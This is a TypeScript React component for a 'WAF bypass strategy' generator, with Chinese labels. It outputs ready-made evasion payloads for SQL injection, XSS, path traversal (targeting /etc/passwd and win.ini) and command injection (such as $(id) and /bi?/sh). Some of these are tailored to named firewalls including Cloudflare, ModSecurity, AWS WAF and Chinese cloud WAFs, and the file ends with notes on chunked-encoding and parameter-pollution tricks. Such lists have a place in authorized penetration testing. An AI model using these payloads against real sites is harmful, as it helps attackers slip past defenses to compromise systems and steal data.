import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

/* ============================================================
 * WAF Bypass Payload Generator
 * Generates bypass techniques for various WAFs and attack types.
 * ========================================================== */

interface BypassGroup {
  title: string;
  payloads: string[];
}

const encodeHex = (s: string): string =>
  s.split('').map((ch) => `%${ch.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase()}`).join('');

const doubleEncode = (s: string): string =>
  s.split('').map((ch) => `%25${ch.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase()}`).join('');

const genSqliBypass = (waf: string): BypassGroup[] => {
  const groups: BypassGroup[] = [];

  // Encoding
  groups.push({
    title: '编码绕过',
    payloads: [
      '1%20OR%201=1',
      '1%27%20OR%201=1--',
      doubleEncode('1\' OR 1=1--'),
      '0x31204f5220313d31',
      'CHAR(49,32,79,82,32,49,61,49)',
    ],
  });

  // Case variation
  groups.push({
    title: '大小写混合',
    payloads: ['1\' Or 1=1--', '1\' oR 1=1--', '1\' OR 1=1--', '1\' OrDeR By 1--'],
  });

  // Comments
  groups.push({
    title: '注释绕过',
    payloads: [
      '1\'/**/OR/**/1=1--',
      '1\'/*!OR*/1=1--',
      '1\'/*foo*/OR/*bar*/1=1--',
      '1\' /*!50000OR*/ 1=1--',
      '1\'/*!50000OR*//*!500001=1*/--',
    ],
  });

  // Whitespace
  groups.push({
    title: '空白字符替换',
    payloads: [
      "1'\tOR\t1=1--",
      "1'\nOR\n1=1--",
      "1'\rOR\r1=1--",
      "1'\fOR\f1=1--",
      '1\'%0aOR%0a1=1--',
      '1\'%0bOR%0b1=1--',
      '1\'%0cOR%0c1=1--',
      '1\'%0dOR%0d1=1--',
      '1\'%a0OR%a01=1--',
    ],
  });

  // Keyword substitution
  groups.push({
    title: '关键字替换',
    payloads: [
      "1' || 1=1--",
      "1' && 1=1--",
      "1' XOR 1=1--",
      "1' !1=1--",
      "1' @:=1 --",
    ],
  });

  // Function substitution
  groups.push({
    title: '函数替换',
    payloads: [
      'UNION SELECT -> UNION ALL SELECT',
      'UNION SELECT -> UNION DISTINCT SELECT',
      'SUBSTRING -> MID / SUBSTR',
      'ASCII -> ORD',
      'CONCAT -> CONCAT_WS / GROUP_CONCAT',
      'IF() -> CASE WHEN ... THEN ... END',
    ],
  });

  // WAF-specific
  if (waf === 'ModSecurity') {
    groups.push({
      title: 'ModSecurity 专用绕过',
      payloads: [
        '1\' /*!50000UNION*//*!50000SELECT*/ 1,2,3--',
        '1\' /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3--',
        '1\' /*!50000%55nion*/ /*!50000%53elect*/ 1,2,3--',
        '1\' /*!50000uNioN+aLl+sElEcT*/ 1,2,3--',
        '1\' /*!50000union*//*!50000distinct*//*!50000select*/ 1,2,3--',
      ],
    });
  }
  if (waf === 'Cloudflare') {
    groups.push({
      title: 'Cloudflare 专用绕过',
      payloads: [
        '1\' union/*--*/select 1,2,3--',
        '1\' union%23%0aselect 1,2,3--',
        '1\' union/*!*/select 1,2,3--',
        '1\' un/**/ion se/**/lect 1,2,3--',
        '1\'/*!12345union*//*!12345select*/1,2,3--',
      ],
    });
  }
  if (waf === 'AWS-WAF') {
    groups.push({
      title: 'AWS WAF 专用绕过',
      payloads: [
        '1\' UNION SELECT 1,2,3--  (利用大小写不敏感)',
        '1\' UnIoN SeLeCt 1,2,3--',
        '1\' union+select 1,2,3--  (URL编码空格)',
        '1\'%20union%20select%201,2,3--',
      ],
    });
  }
  if (waf === '阿里云') {
    groups.push({
      title: '阿里云 WAF 专用绕过',
      payloads: [
        '1\' union/*!50000select*/1,2,3--',
        '1\' %75nion %73elect 1,2,3--',
        '1\' 0x75nion 0x73elect 1,2,3--',
        '1\' /*!uNIOn*//*!SeLeCt*/ 1,2,3--',
      ],
    });
  }
  if (waf === '腾讯云') {
    groups.push({
      title: '腾讯云 WAF 专用绕过',
      payloads: [
        '1\' union select 1,2,3--  (利用分块传输)',
        '1\' %0aunion%0aselect%0a1,2,3--',
        '1\'/*!50000union*//*!50000select*/1,2,3--',
        '1\' UnIoN/**/SeLeCt/**/1,2,3--',
      ],
    });
  }

  // HPP (HTTP Parameter Pollution)
  groups.push({
    title: 'HTTP 参数污染 (HPP)',
    payloads: [
      '?id=1&id=UNION SELECT 1,2,3--',
      '?id=1;SELECT&id=* FROM users',
      '?id=1 UNION/**/&id=**/SELECT 1,2,3',
    ],
  });

  return groups;
};

const genXssBypass = (waf: string): BypassGroup[] => {
  const groups: BypassGroup[] = [];

  groups.push({
    title: '编码绕过',
    payloads: [
      '<img src=x onerror=alert(1)>',
      encodeHex('<script>alert(1)</script>'),
      doubleEncode('<script>alert(1)</script>'),
      '&#60;script&#62;alert(1)&#60;/script&#62;',
      '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    ],
  });

  groups.push({
    title: '大小写混合',
    payloads: [
      '<ScRiPt>alert(1)</ScRiPt>',
      '<IMG SRC=x OnErRoR=alert(1)>',
      '<sCrIpT>alert(1)</sCrIpT>',
    ],
  });

  groups.push({
    title: '标签替换',
    payloads: [
      '<svg onload=alert(1)>',
      '<svg/onload=alert(1)>',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<details open ontoggle=alert(1)>',
      '<marquee onstart=alert(1)>',
      '<video src=x onerror=alert(1)>',
      '<audio src=x onerror=alert(1)>',
    ],
  });

  groups.push({
    title: '事件处理绕过',
    payloads: [
      '<img src=x:onerror=alert(1)>',
      '<img src=x onerror="alert`1`">',
      '<img src=x onerror=alert(/1/)>',
      '<img src=x onerror=alert(1)>',
      '<img src=x:alert(1)>',
    ],
  });

  groups.push({
    title: 'JavaScript 上下文',
    payloads: [
      "';alert(1)//",
      "';alert(1)//'",
      '</script><script>alert(1)</script>',
      "\\';alert(1)//",
      '${alert(1)}',
    ],
  });

  if (waf === 'Cloudflare') {
    groups.push({
      title: 'Cloudflare 专用绕过',
      payloads: [
        '<svg/onload=alert``>',
        '<svg/onload=alert(1)>',
        '<img/src/onerror=alert(1)>',
        '<details/open/ontoggle=alert(1)>',
        '<svg><script>alert(1)</script></svg>',
      ],
    });
  }

  groups.push({
    title: '无括号/无引号',
    payloads: [
      '<img src=x onerror=alert`1`>',
      '<img src=x onerror=alert(1)>',
      '<img src=x onerror=window.name>',
      '<svg onload=alert(1)>',
      '<svg onload=alert(/xss/)>',
    ],
  });

  return groups;
};

const genPathBypass = (): BypassGroup[] => [
  {
    title: '编码绕过',
    payloads: [
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      doubleEncode('../../../etc/passwd'),
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc/passwd',
    ],
  },
  {
    title: '混合分隔符',
    payloads: [
      '....//....//....//etc/passwd',
      '..%5c..%5c..%5cwindows%5cwin.ini',
      '..\\..\\..\\windows\\win.ini',
      '..%255c..%255c..%255cwindows%255cwin.ini',
    ],
  },
  {
    title: 'Unicode/UTF-8',
    payloads: [
      '..%c0%af..%c0%afetc/passwd',
      '..%ef%bc%8f..%ef%bc%8fetc/passwd',
      '..%e2%80%ae/../etc/passwd',
    ],
  },
];

const genCmdiBypass = (): BypassGroup[] => [
  {
    title: '编码绕过',
    payloads: [
      '| id',
      '%7c%20id',
      doubleEncode('| id'),
      '| ${IFS}id',
    ],
  },
  {
    title: '无空格绕过',
    payloads: [
      '|{IFS}id',
      '|$IFS$id',
      '|id',
      '|\tid',
      '|\n\tid',
      '|<id',
    ],
  },
  {
    title: '命令替换',
    payloads: [
      '`id`',
      '$(id)',
      '${IFS}$(id)',
      '$({id,})',
    ],
  },
  {
    title: '通配符',
    payloads: [
      '|/???/??d',
      '|/???/???/?? -c id',
      '|/bi?/sh',
      '|/bi*/sh',
    ],
  },
];

const generateBypass = (payload: string, waf: string, attack: string): string => {
  const lines: string[] = [];
  lines.push(`── WAF 绕过策略 (${waf} / ${attack}) ──`);
  lines.push(` [原始 payload] ${payload || '(参考各技术示例)'}`);
  lines.push('');

  let groups: BypassGroup[] = [];
  switch (attack) {
    case 'SQLi':
      groups = genSqliBypass(waf);
      break;
    case 'XSS':
      groups = genXssBypass(waf);
      break;
    case 'path-traversal':
      groups = genPathBypass();
      break;
    case 'cmdi':
      groups = genCmdiBypass();
      break;
    default:
      groups = genSqliBypass(waf);
  }

  for (const g of groups) {
    lines.push(` ▸ ${g.title}:`);
    for (const p of g.payloads) {
      lines.push(`   ${p}`);
    }
    lines.push('');
  }

  // General techniques
  lines.push(' ▸ 通用绕过技术:');
  lines.push('   - 编码: URL / 双重URL / Unicode / Base64 / Hex');
  lines.push('   - 分块传输: Transfer-Encoding: chunked');
  lines.push('   - HTTP 方法: GET→POST / PUT / PATCH');
  lines.push('   - 参数污染: HPP (同参数多次出现)');
  lines.push('   - 大小写: UnIoN SeLeCt');
  lines.push('   - 注释: /**/ / /*!*/ / /*!50000*/');
  lines.push('   - 换行: %0a / %0d%0a / \\n');
  lines.push('   - Unicode: \\u0027 / %c0%27');
  lines.push('   - 双重编码: %2527 → %27 → \'');
  lines.push('   - 分片: 分多个请求拼接 payload');
  lines.push('');

  // WAF-specific notes
  lines.push(` ▸ ${waf} 特性说明:`);
  switch (waf) {
    case 'ModSecurity':
      lines.push('   - 基于 OWASP CRS 规则集, 对关键字敏感');
      lines.push('   - MySQL 内联注释 /*!50000*/ 可绕过部分规则');
      lines.push('   - 大小写不敏感匹配, 需用编码/注释拆分关键字');
      break;
    case 'Cloudflare':
      lines.push('   - 对常见 payload 有强检测, 需用变形/编码');
      lines.push('   - HTML 实体编码和 Unicode 转义有效');
      lines.push('   - 分块传输和参数污染有一定效果');
      break;
    case 'AWS-WAF':
      lines.push('   - 基于规则组, 对固定模式检测');
      lines.push('   - 大小写变体和 URL 编码有效');
      lines.push('   - SQLi 规则组对 UNION SELECT 敏感');
      break;
    case '阿里云':
      lines.push('   - 语义分析 + 规则匹配');
      lines.push('   - 内联注释和编码绕过有效');
      lines.push('   - 对分块传输检测较弱');
      break;
    case '腾讯云':
      lines.push('   - 规则匹配 + AI 引擎');
      lines.push('   - 换行符和注释拆分有效');
      lines.push('   - 对 HPP 有一定检测能力');
      break;
    default:
      lines.push('   - 通用绕过: 编码 + 大小写 + 注释 + 空白字符');
      lines.push('   - 组合多种技术提高成功率');
  }

  lines.push('');
  lines.push(' 说明:');
  lines.push('  - WAF 绕过需要结合具体场景调整, 无通用 payload');
  lines.push('  - 编码绕过最基础: URL编码 → 双重编码 → Unicode → Base64');
  lines.push('  - 注释拆分: UNION/**/SELECT → /*!50000UNION*/SELECT');
  lines.push('  - 空白字符: 空格 → Tab → %0a → %a0 → ${IFS}');
  lines.push('  - 分块传输可绕过基于请求体的 WAF 检测');
  lines.push('  - HPP 利用不同服务器对重复参数的处理差异');
  return lines.join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="WAF绕过策略"
    paramsConfig={[
      {
        name: 'waf',
        label: 'WAF',
        type: 'select',
        default: '通用',
        options: [
          { value: 'ModSecurity', label: 'ModSecurity' },
          { value: 'Cloudflare', label: 'Cloudflare' },
          { value: 'AWS-WAF', label: 'AWS WAF' },
          { value: '阿里云', label: '阿里云' },
          { value: '腾讯云', label: '腾讯云' },
          { value: '通用', label: '通用' },
        ],
      },
      {
        name: 'attack',
        label: '攻击类型',
        type: 'select',
        default: 'SQLi',
        options: [
          { value: 'SQLi', label: 'SQL注入' },
          { value: 'XSS', label: 'XSS' },
          { value: 'path-traversal', label: '路径穿越' },
          { value: 'cmdi', label: '命令注入' },
        ],
      },
    ]}
    execute={(input: string, _mode: string, params: Record<string, unknown>): string => {
      const waf = (params.waf as string) ?? '通用';
      const attack = (params.attack as string) ?? 'SQLi';
      return generateBypass(input, waf, attack);
    }}
  />
);
export default ToolComponent;
